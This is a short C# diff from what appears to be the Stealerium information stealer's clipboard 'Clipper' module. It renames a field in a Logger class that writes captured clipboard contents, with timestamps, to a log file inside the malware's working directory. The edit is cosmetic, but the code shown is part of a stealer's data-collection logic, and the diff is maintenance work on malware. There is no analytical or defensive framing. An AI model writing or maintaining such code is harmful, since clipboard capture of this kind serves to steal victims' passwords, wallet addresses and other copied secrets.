@@ -6,7 +6,7 @@ namespace Stealerium.Clipper
 {
     internal sealed class Logger
     {
-        private static readonly string _logDirectory = Path.Combine(
+        private static readonly string LogDirectory = Path.Combine(
             Paths.InitWorkDir(), "logs\\clipboard\\" +
                                  DateTime.Now.ToString("yyyy-MM-dd"));
 
@@ -16,9 +16,9 @@ namespace Stealerium.Clipper
             if (string.IsNullOrWhiteSpace(buffer))
                 return;
 
-            var logfile = _logDirectory + "\\clipboard_logs.txt";
-            if (!Directory.Exists(_logDirectory))
-                Directory.CreateDirectory(_logDirectory);
+            var logfile = LogDirectory + "\\clipboard_logs.txt";
+            if (!Directory.Exists(LogDirectory))
+                Directory.CreateDirectory(LogDirectory);
 
             File.AppendAllText(logfile,
                 "### " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " ###\n" + buffer + "\n\n");
